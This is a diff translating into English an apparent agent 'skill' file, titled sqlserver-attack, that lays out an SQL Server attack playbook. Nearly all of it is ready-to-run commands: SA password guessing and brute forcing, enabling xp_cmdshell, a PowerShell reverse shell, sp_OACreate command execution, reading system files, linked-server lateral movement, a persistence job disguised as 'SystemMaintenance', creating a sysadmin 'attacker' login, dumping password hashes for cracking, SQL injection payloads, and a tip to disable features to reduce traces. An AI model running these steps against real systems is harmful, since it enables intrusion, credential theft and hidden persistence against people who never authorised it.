@@ -1,77 +1,79 @@
 ---
 name: sqlserver-attack
-description: "SQL Server 渗透测试与利用。当发现目标开放 1433 端口、SQL Server 允许远程连接（SA 弱口令）、需要从数据库提取数据或实现命令执行时使用。覆盖未授权访问、数据库枚举与导出、xp_cmdshell 命令执行、sp_OACreate COM 对象利用、BULK INSERT 文件读取、Linked Server 横向移动、SQL Agent Job 持久化、存储过程利用、用户创建与提权"
+description: "SQL Server penetration testing and exploitation. Use when a target exposes port 1433, SQL Server allows remote connections (weak SA password), or you need to extract data from the database or achieve command execution. Covers unauthorized access, database enumeration and dumping, xp_cmdshell command execution, sp_OACreate COM object abuse, BULK INSERT file reads, Linked Server lateral movement, SQL Agent Job persistence, stored procedure abuse, and user creation for privilege escalation"
+zh-signals: "SQL Server 渗透测试与利用，覆盖 xp_cmdshell 命令执行与横向移动。信号:SQL Server,MSSQL,1433,xp_cmdshell,数据库攻击"
+when-to-use: "Use when a target exposes SQL Server on 1433 with remote access or weak SA credentials and you need to enumerate, extract data, or execute commands."
 metadata:
-  tags: "sqlserver,mssql,1433,sa,xp_cmdshell,sp_oacreate,linked-server,bulk-insert,sql-agent,存储过程"
+  tags: "sqlserver,mssql,1433,sa,xp_cmdshell,sp_oacreate,linked-server,bulk-insert,sql-agent,stored-procedure"
   category: "exploit"
 ---
 
-# SQL Server 渗透测试与利用
+# SQL Server Penetration Testing and Exploitation
 
-SQL Server 默认监听 1433 端口，SA 弱口令是最常见的入口点。一旦获得 sysadmin 权限，通过 xp_cmdshell 即可直接执行操作系统命令；即使 xp_cmdshell 被禁用，仍有 sp_OACreate、CLR Assembly、SQL Agent Job 等多条 RCE 路径。Linked Server 机制更是内网横向移动的重要跳板。
+SQL Server listens on port 1433 by default, and a weak SA password is the most common entry point. Once sysadmin rights are obtained, xp_cmdshell allows direct operating system command execution; even when xp_cmdshell is disabled, multiple RCE paths remain available such as sp_OACreate, CLR Assembly, and SQL Agent Jobs. The Linked Server mechanism is an important pivot for lateral movement inside the internal network.
 
-## 深入参考（必读）
-- 完整利用命令和 payload -> 读 [references/attack-techniques.md](references/attack-techniques.md)
+## Further Reading (Must Read)
+- Full exploitation commands and payloads -> read [references/attack-techniques.md](references/attack-techniques.md)
 
 ---
 
-## Phase 1: 服务发现
+## Phase 1: Service Discovery
 
-### 1.1 端口扫描与版本识别
+### 1.1 Port Scanning and Version Identification
 
 ```bash
-# Nmap 版本探测
+# Nmap version probe
 nmap -sV -p 1433 TARGET
 
-# SQL Server 信息收集脚本
+# SQL Server information gathering script
 nmap -p 1433 --script ms-sql-info TARGET
 
-# 探测 SQL Server Browser（UDP 1434，获取实例信息）
+# Probe SQL Server Browser (UDP 1434, retrieves instance information)
 nmap -sU -p 1434 --script ms-sql-info TARGET
 ```
 
-### 1.2 手动连接测试
+### 1.2 Manual Connection Test
 
 ```bash
-# sqlcmd（微软官方客户端）
+# sqlcmd (official Microsoft client)
 sqlcmd -S TARGET,1433 -U sa -P 'password' -Q "SELECT @@version;"
 
-# mssqlclient.py（Impacket，渗透测试首选）
+# mssqlclient.py (Impacket, the pentesting favorite)
 mssqlclient.py sa:'password'@TARGET -port 1433
 
-# sqsh（Linux 原生客户端）
+# sqsh (native Linux client)
 sqsh -S TARGET:1433 -U sa -P 'password'
 
-# Windows 认证（当前域凭据）
+# Windows authentication (current domain credentials)
 sqlcmd -S TARGET -E -Q "SELECT @@version;"
 
-# mssqlclient.py Windows 认证
+# mssqlclient.py with Windows authentication
 mssqlclient.py DOMAIN/user:'password'@TARGET -windows-auth
 ```
 
-**关键判断**：
-- 返回版本信息 -> 已连接，进入 Phase 3
-- 返回 `Login failed for user` -> 密码错误，进入 Phase 2
-- 返回 `TCP Provider: Error` -> 网络不通或端口被防火墙拦截
-- 返回版本号 -> 确定 SQL Server 版本（影响可用攻击路径）
+**Key Decision**:
+- Version information returned -> connected, proceed to Phase 3
+- `Login failed for user` returned -> wrong password, proceed to Phase 2
+- `TCP Provider: Error` returned -> network unreachable or the port is blocked by a firewall
+- Version number returned -> determine the SQL Server version (it affects the available attack paths)
 
 ---
 
-## Phase 2: 认证检测
+## Phase 2: Authentication Checks
 
-### 2.1 认证模式
+### 2.1 Authentication Modes
 
 ```
-SQL Server 认证模式（影响攻击路径）
-├─ SQL Server 认证 — 用户名 + 密码（SA 弱口令最常见）
-├─ Windows 认证 — 域凭据（NTLM/Kerberos）
-└─ 混合模式 — 同时支持以上两种（最常见配置）
+SQL Server authentication mode (determines the attack path)
+├─ SQL Server authentication — username + password (weak SA passwords are most common)
+├─ Windows authentication — domain credentials (NTLM/Kerberos)
+└─ Mixed mode — supports both of the above (the most common configuration)
 ```
 
-### 2.2 SA 弱口令检测
+### 2.2 SA Weak Password Testing
 
 ```bash
-# 常见 SA 默认密码
+# Common SA default passwords
 sqlcmd -S TARGET -U sa -P '' -Q "SELECT 1;"
 sqlcmd -S TARGET -U sa -P 'sa' -Q "SELECT 1;"
 sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT 1;"
@@ -79,11 +81,11 @@ sqlcmd -S TARGET -U sa -P '123456' -Q "SELECT 1;"
 sqlcmd -S TARGET -U sa -P 'admin' -Q "SELECT 1;"
 sqlcmd -S TARGET -U sa -P 'Password1' -Q "SELECT 1;"
 
-# Windows 认证（无需密码，使用当前凭据）
+# Windows authentication (no password, uses the current credentials)
 sqlcmd -S TARGET -E -Q "SELECT 1;"
 ```
 
-### 2.3 暴力破解
+### 2.3 Brute Force
 
 ```bash
 # Hydra
@@ -103,112 +105,112 @@ msf> run
 
 ---
 
-## Phase 3: 攻击决策树
+## Phase 3: Attack Decision Tree
 
 ```
-已连接 SQL Server？
-├─ 查询当前权限
+Connected to SQL Server?
+├─ Query the current privileges
 │   SELECT SYSTEM_USER, USER_NAME();
 │   SELECT IS_SRVROLEMEMBER('sysadmin');
 │
-├─ sysadmin (SA) 权限
-│   ├─ xp_cmdshell 可启用 -> RCE (Phase 4.1)
-│   ├─ xp_cmdshell 被禁且无法启用 -> sp_OACreate COM 对象 RCE (Phase 4.2)
-│   ├─ 有 BULK INSERT 权限 -> 文件读取 (Phase 4.3)
-│   ├─ 有 Linked Server -> 横向移动到其他 SQL Server (Phase 5.1)
-│   ├─ 有 SQL Agent 权限 -> Job 持久化 (Phase 5.2)
-│   ├─ CLR 集成可启用 -> CLR Assembly RCE (Phase 4.2)
-│   └─ sys.sql_logins 可查 -> 凭据提取 (Phase 6.2)
+├─ sysadmin (SA) privileges
+│   ├─ xp_cmdshell can be enabled -> RCE (Phase 4.1)
+│   ├─ xp_cmdshell disabled and cannot be enabled -> sp_OACreate COM object RCE (Phase 4.2)
+│   ├─ BULK INSERT permission available -> file read (Phase 4.3)
+│   ├─ Linked Server available -> lateral movement to other SQL Servers (Phase 5.1)
+│   ├─ SQL Agent permission available -> Job persistence (Phase 5.2)
+│   ├─ CLR integration can be enabled -> CLR Assembly RCE (Phase 4.2)
+│   └─ sys.sql_logins readable -> credential extraction (Phase 6.2)
 │
-├─ 普通数据库用户权限
-│   ├─ information_schema 可查 -> 数据库枚举 (Phase 6.1)
-│   ├─ IMPERSONATE 权限 -> 模拟其他用户提权
-│   ├─ db_owner 角色 -> 通过 EXECUTE AS 提权
-│   └─ 尝试提权 -> sp_addsrvrolemember (Phase 6.3)
+├─ Normal database user privileges
+│   ├─ information_schema readable -> database enumeration (Phase 6.1)
+│   ├─ IMPERSONATE permission -> privilege escalation via impersonation
+│   ├─ db_owner role -> privilege escalation via EXECUTE AS
+│   └─ Attempt privilege escalation -> sp_addsrvrolemember (Phase 6.3)
 │
-└─ SQL 注入场景
-    ├─ 堆叠注入可用 -> xp_cmdshell RCE
-    ├─ UNION 注入 -> 数据提取
-    ├─ 时间盲注 -> WAITFOR DELAY 探测
-    └─ 报错注入 -> CONVERT 类型转换报错
+└─ SQL injection scenario
+    ├─ Stacked queries available -> xp_cmdshell RCE
+    ├─ UNION injection -> data extraction
+    ├─ Time-based blind injection -> probing with WAITFOR DELAY
+    └─ Error-based injection -> CONVERT type conversion errors
 ```
 
-### 前置信息收集
+### Preliminary Information Gathering
 
 ```bash
-# 当前用户与权限
+# Current user and privileges
 sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT SYSTEM_USER, USER_NAME();"
 sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT IS_SRVROLEMEMBER('sysadmin');"
 
-# SQL Server 版本
+# SQL Server version
 sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT @@version;"
 
-# 所有数据库
+# All databases
 sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT name FROM sys.databases;"
 
-# 服务器配置（xp_cmdshell、OLE Automation 等是否启用）
+# Server configuration (whether xp_cmdshell, OLE Automation, etc. are enabled)
 sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC sp_configure;"
 
-# 检查 Linked Server
+# Check linked servers
 sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC sp_linkedservers;"
 
-# 检查 SQL Agent 状态
+# Check SQL Agent status
 sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT dss.status_desc FROM sys.dm_server_services dss WHERE servicename LIKE '%Agent%';"
 
-# mssqlclient.py 交互式枚举
+# Interactive enumeration with mssqlclient.py
 mssqlclient.py sa:'password'@TARGET
-# 进入后执行：
-# enum_db         — 列出数据库
-# enum_logins     — 枚举登录账户
-# enum_impersonate — 检查可模拟的用户
+# After entering, run:
+# enum_db         — list databases
+# enum_logins     — enumerate login accounts
+# enum_impersonate — check impersonable users
 ```
 
 ---
 
-## Phase 4: RCE 速查
+## Phase 4: RCE Quick Reference
 
-### 4.1 xp_cmdshell 命令执行（需 sysadmin）
+### 4.1 xp_cmdshell Command Execution (requires sysadmin)
 
 ```bash
-# 启用 xp_cmdshell
+# Enable xp_cmdshell
 sqlcmd -S TARGET -U sa -P 'password' -Q "
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
 
-# 执行系统命令
+# Execute system commands
 sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC xp_cmdshell 'whoami';"
 sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC xp_cmdshell 'ipconfig';"
 
-# 反弹 Shell（PowerShell）
+# Reverse shell (PowerShell)
 sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';"
 
-# mssqlclient.py（自动启用 xp_cmdshell）
+# mssqlclient.py (enables xp_cmdshell automatically)
 mssqlclient.py sa:'password'@TARGET
-# 进入后执行：
+# After entering, run:
 # enable_xp_cmdshell
 # xp_cmdshell whoami
 
-# 用完后禁用（减少痕迹）
+# Disable it again after use (reduce traces)
 sqlcmd -S TARGET -U sa -P 'password' -Q "
 EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
 EXEC sp_configure 'show advanced options', 0; RECONFIGURE;"
 ```
 
-### 4.2 sp_OACreate COM 对象 RCE（xp_cmdshell 被禁时的替代方案）
+### 4.2 sp_OACreate COM Object RCE (alternative when xp_cmdshell is disabled)
 
 ```bash
-# 启用 OLE Automation
+# Enable OLE Automation
 sqlcmd -S TARGET -U sa -P 'password' -Q "
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;"
 
-# 通过 wscript.shell 执行命令
+# Execute a command through wscript.shell
 sqlcmd -S TARGET -U sa -P 'password' -Q "
 DECLARE @shell INT;
 EXEC sp_oacreate 'wscript.shell', @shell OUTPUT;
 EXEC sp_oamethod @shell, 'run', NULL, 'cmd /c whoami > C:\temp\output.txt';"
 
-# 通过 Scripting.FileSystemObject 写文件
+# Write a file through Scripting.FileSystemObject
 sqlcmd -S TARGET -U sa -P 'password' -Q "
 DECLARE @fs INT, @file INT;
 EXEC sp_oacreate 'Scripting.FileSystemObject', @fs OUTPUT;
@@ -217,52 +219,52 @@ EXEC sp_oamethod @file, 'Write', NULL, 'malicious content';
 EXEC sp_oamethod @file, 'Close';"
 ```
 
-### 4.3 BULK INSERT 文件读取
+### 4.3 BULK INSERT File Read
 
 ```bash
-# 读取本地文件
+# Read a local file
 sqlcmd -S TARGET -U sa -P 'password' -Q "
 CREATE TABLE #tmp (line VARCHAR(MAX));
 BULK INSERT #tmp FROM 'C:\Windows\System32\drivers\etc\hosts';
 SELECT * FROM #tmp;
 DROP TABLE #tmp;"
 
-# OPENROWSET 读取文件
+# Read a file with OPENROWSET
 sqlcmd -S TARGET -U sa -P 'password' -Q "
 SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS Contents;"
 ```
 
--> 更多方法与完整 payload -> 读 [references/attack-techniques.md](references/attack-techniques.md)
+-> More methods and full payloads -> read [references/attack-techniques.md](references/attack-techniques.md)
 
 ---
 
-## Phase 5: 横向移动与持久化速查
+## Phase 5: Lateral Movement and Persistence Quick Reference
 
-### 5.1 Linked Server 横向移动
+### 5.1 Linked Server Lateral Movement
 
 ```bash
-# 列出所有 Linked Server
+# List all linked servers
 sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC sp_linkedservers;"
 
-# 通过 OPENQUERY 在远程服务器执行查询
+# Run a query on the remote server through OPENQUERY
 sqlcmd -S TARGET -U sa -P 'password' -Q "
 SELECT * FROM OPENQUERY(LINKED_SERVER, 'SELECT @@servername; SELECT @@version;');"
 
-# 通过 EXEC AT 在远程服务器执行命令（链式利用）
+# Execute commands on the remote server through EXEC AT (chained exploitation)
 sqlcmd -S TARGET -U sa -P 'password' -Q "
 EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT LINKED_SERVER;
 EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT LINKED_SERVER;
 EXEC ('EXEC xp_cmdshell ''whoami'';') AT LINKED_SERVER;"
 
-# 嵌套 Linked Server（多跳横向移动）
+# Nested linked servers (multi-hop lateral movement)
 sqlcmd -S TARGET -U sa -P 'password' -Q "
 SELECT * FROM OPENQUERY(SERVER_A, 'SELECT * FROM OPENQUERY(SERVER_B, ''SELECT @@servername'')');"
 ```
 
-### 5.2 SQL Agent Job 持久化
+### 5.2 SQL Agent Job Persistence
 
 ```bash
-# 创建持久化 Job
+# Create a persistence job
 sqlcmd -S TARGET -U sa -P 'password' -Q "
 USE msdb;
 EXEC dbo.sp_add_job @job_name = 'SystemMaintenance';
@@ -273,7 +275,7 @@ EXEC dbo.sp_add_jobstep @job_name = 'SystemMaintenance',
 EXEC dbo.sp_add_jobserver @job_name = 'SystemMaintenance';
 EXEC dbo.sp_start_job @job_name = 'SystemMaintenance';"
 
-# 添加定时计划（每天执行）
+# Attach a schedule (runs every day)
 sqlcmd -S TARGET -U sa -P 'password' -Q "
 USE msdb;
 EXEC dbo.sp_add_schedule @schedule_name = 'DailyRun',
@@ -283,70 +285,70 @@ EXEC dbo.sp_add_schedule @schedule_name = 'DailyRun',
 EXEC dbo.sp_attach_schedule @job_name = 'SystemMaintenance',
     @schedule_name = 'DailyRun';"
 
-# 列出现有 Job
+# List existing jobs
 sqlcmd -S TARGET -U sa -P 'password' -Q "EXEC msdb.dbo.sp_help_job;"
 ```
 
--> 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整技术细节
+-> read [references/attack-techniques.md](references/attack-techniques.md) for the full technical details
 
 ---
 
-## Phase 6: 数据提取与提权
+## Phase 6: Data Extraction and Privilege Escalation
 
-### 6.1 数据库枚举
+### 6.1 Database Enumeration
 
 ```bash
-# 列出所有数据库
+# List all databases
 sqlcmd -S TARGET -U sa -P 'password' -Q "SELECT name FROM sys.databases;"
 
-# 列出指定数据库的所有表
+# List all tables in a given database
 sqlcmd -S TARGET -U sa -P 'password' -d DATABASE_NAME -Q "
 SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;"
 
-# 搜索敏感表名
+# Search for sensitive table names
 sqlcmd -S TARGET -U sa -P 'password' -d DATABASE_NAME -Q "
 SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
 WHERE TABLE_NAME LIKE '%password%' OR TABLE_NAME LIKE '%user%' OR TABLE_NAME LIKE '%credential%';"
 
-# 搜索敏感列名
+# Search for sensitive column names
 sqlcmd -S TARGET -U sa -P 'password' -d DATABASE_NAME -Q "
 SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
 WHERE COLUMN_NAME LIKE '%password%' OR COLUMN_NAME LIKE '%secret%' OR COLUMN_NAME LIKE '%token%';"
 ```
 
-### 6.2 凭据提取
+### 6.2 Credential Extraction
 
 ```bash
-# 提取 SQL Server 登录哈希（需 sysadmin）
+# Extract SQL Server login hashes (requires sysadmin)
 sqlcmd -S TARGET -U sa -P 'password' -Q "
 SELECT name, password_hash FROM sys.sql_logins;"
 
-# 列出所有服务器级登录
+# List all server-level logins
 sqlcmd -S TARGET -U sa -P 'password' -Q "
 SELECT name, type_desc, is_disabled FROM sys.server_principals;"
 
-# 列出 sysadmin 成员
+# List sysadmin members
 sqlcmd -S TARGET -U sa -P 'password' -Q "
 SELECT name FROM sys.server_principals
 WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;"
 ```
 
-### 6.3 用户创建与提权
+### 6.3 User Creation and Privilege Escalation
 
 ```bash
-# 创建新登录并赋予 sysadmin
+# Create a new login and grant it sysadmin
 sqlcmd -S TARGET -U sa -P 'password' -Q "
 CREATE LOGIN attacker WITH PASSWORD = 'P@ssw0rd!';
 EXEC sp_addsrvrolemember 'attacker', 'sysadmin';"
 
-# IMPERSONATE 提权（检查并利用模拟权限）
+# IMPERSONATE escalation (check and exploit impersonation rights)
 sqlcmd -S TARGET -U sa -P 'password' -Q "
 SELECT DISTINCT grantee_principal_id, name
 FROM sys.server_permissions
 JOIN sys.server_principals ON grantee_principal_id = principal_id
 WHERE permission_name = 'IMPERSONATE';"
 
-# 模拟 SA 执行命令
+# Impersonate SA to execute commands
 sqlcmd -S TARGET -U lowpriv -P 'password' -Q "
 EXECUTE AS LOGIN = 'sa';
 EXEC xp_cmdshell 'whoami';
@@ -355,58 +357,58 @@ REVERT;"
 
 ---
 
-## SQL 注入速查
+## SQL Injection Quick Reference
 
 ```bash
-# 版本探测
+# Version detection
 ' UNION SELECT NULL,@@version--
 
-# 当前用户
+# Current user
 ' UNION SELECT NULL,SYSTEM_USER--
 
-# 数据库列表
+# Database list
 ' UNION SELECT NULL,name FROM master..sysdatabases--
 
-# 表列表
+# Table list
 ' UNION SELECT NULL,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--
 
-# 时间盲注
+# Time-based blind injection
 '; WAITFOR DELAY '0:0:5'--
 
-# 堆叠注入 + xp_cmdshell RCE（最高威胁）
+# Stacked injection + xp_cmdshell RCE (highest threat)
 '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--
 
-# 报错注入（提取数据）
+# Error-based injection (data extraction)
 ' AND 1=CONVERT(int,(SELECT @@version))--
 
-# 布尔盲注
+# Boolean blind injection
 ' AND SUBSTRING(@@version,1,1)='M'--
 ```
 
 ---
 
-## 工具速查
+## Tool Quick Reference
 
-| 工具 | 用途 |
+| Tool | Purpose |
 |------|------|
-| sqlcmd | SQL Server 官方命令行客户端 |
-| mssqlclient.py | Impacket 渗透测试客户端（推荐） |
-| sqsh | Linux 原生 SQL Server 客户端 |
-| PowerUpSQL | PowerShell SQL Server 审计与利用框架 |
-| hydra / medusa | SQL Server 密码爆破 |
-| nmap ms-sql-* | Nmap 内置 SQL Server 脚本集 |
-| sqlmap | SQL 注入自动化检测与利用 |
-| Metasploit | SQL Server 模块集合（登录/枚举/RCE） |
+| sqlcmd | Official SQL Server command line client |
+| mssqlclient.py | Impacket pentesting client (recommended) |
+| sqsh | Native Linux SQL Server client |
+| PowerUpSQL | PowerShell auditing and exploitation framework for SQL Server |
+| hydra / medusa | SQL Server password brute forcing |
+| nmap ms-sql-* | Built-in Nmap SQL Server script set |
+| sqlmap | Automated SQL injection detection and exploitation |
+| Metasploit | SQL Server module collection (login / enumeration / RCE) |
 
 ---
 
-## 注意事项
+## Notes
 
-- `xp_cmdshell` 启用后 SQL Server 日志会记录，操作完成后应立即禁用
-- `sp_OACreate` 执行命令无直接回显，需通过写文件或外带方式获取输出
-- Linked Server 横向移动时，远程服务器的权限取决于 Linked Server 配置的映射账户
-- SQL Agent Job 需要 SQL Server Agent 服务处于运行状态
-- BULK INSERT 要求 SQL Server 服务账户对文件有读取权限
-- 云托管 SQL Server（Azure SQL/RDS）通常禁用 xp_cmdshell 和文件系统访问
-- Windows 认证场景下，需先获取域凭据或在域内机器上操作
-- `password_hash` 从 sys.sql_logins 提取后可用 hashcat 模式 1731 破解
+- Once `xp_cmdshell` is enabled, SQL Server logs record it, so it should be disabled immediately after the operation
+- `sp_OACreate` command execution produces no direct output, so the output has to be retrieved by writing to a file or exfiltrating it
+- During linked server lateral movement, the remote server privileges depend on the mapped account configured for the linked server
+- SQL Agent Jobs require the SQL Server Agent service to be running
+- BULK INSERT requires the SQL Server service account to have read access to the file
+- Cloud-hosted SQL Server (Azure SQL/RDS) usually disables xp_cmdshell and file system access
+- In Windows authentication scenarios, domain credentials must be obtained first or the operations must be performed from a machine inside the domain
+- `password_hash` values extracted from sys.sql_logins can be cracked with hashcat mode 1731
